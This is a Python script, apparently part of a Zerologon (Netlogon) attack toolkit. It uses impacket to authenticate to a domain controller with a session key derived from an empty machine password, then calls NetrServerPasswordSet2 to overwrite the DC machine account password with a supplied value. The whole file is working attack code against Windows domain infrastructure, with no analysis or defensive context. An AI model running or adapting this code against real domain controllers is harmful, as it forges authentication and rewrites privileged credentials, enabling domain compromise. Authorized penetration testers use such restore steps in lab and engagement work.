from struct import pack, unpack

from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket.dcerpc.v5 import epm, nrpc

class ChangeMachinePassword():
    def __init__(self, dc_ip, remoteName, password):
        self.dc_ip = dc_ip
        self.remoteName = remoteName.rstrip("$")
        self.hexPassword = password

    def changePassword(self):
        stringbinding = epm.hept_map(self.dc_ip, nrpc.MSRPC_UUID_NRPC, protocol = "ncacn_ip_tcp")
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)

        resp = nrpc.hNetrServerReqChallenge(dce, NULL, self.remoteName + "\x00", b"12345678")
        serverChallenge = resp["ServerChallenge"]

        # Empty at this point
        self.sessionKey = nrpc.ComputeSessionKeyAES("", b"12345678", serverChallenge)

        self.ppp = nrpc.ComputeNetlogonCredentialAES(b"12345678", self.sessionKey)

        try:
            resp = nrpc.hNetrServerAuthenticate3(dce, "\\\\" + self.remoteName + "\x00", self.remoteName + "$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,self.remoteName + "\x00",self.ppp, 0x212fffff )
        except Exception as e:
            if str(e).find("STATUS_DOWNGRADE_DETECTED") < 0:
                raise
        self.clientStoredCredential = pack("<Q", unpack("<Q",self.ppp)[0] + 10)

        request = NetrServerPasswordSet2()
        request["PrimaryName"] = "\\\\" + self.remoteName + "\x00"
        request["AccountName"] = self.remoteName + "$\x00"
        request["SecureChannelType"] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        request["Authenticator"] = self.update_authenticator()
        request["ComputerName"] = self.remoteName + "\x00"
        _ = nrpc.ComputeNetlogonCredentialAES(self.hexPassword, self.sessionKey)
        indata = b"\x00" * (512-len(self.hexPassword)) + self.hexPassword + pack("<L", len(self.hexPassword))
        request["ClearNewPassword"] = nrpc.ComputeNetlogonCredentialAES(indata, self.sessionKey)
        try:
            dce.request(request)
            print("[+] Restore DC password: OK")
        except Exception as e:
            print(f"[-] Restore DC password: Failed, error: {e!s}")

    def update_authenticator(self, plus=10):
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator["Credential"] = nrpc.ComputeNetlogonCredentialAES(self.clientStoredCredential, self.sessionKey)
        authenticator["Timestamp"] = plus
        return authenticator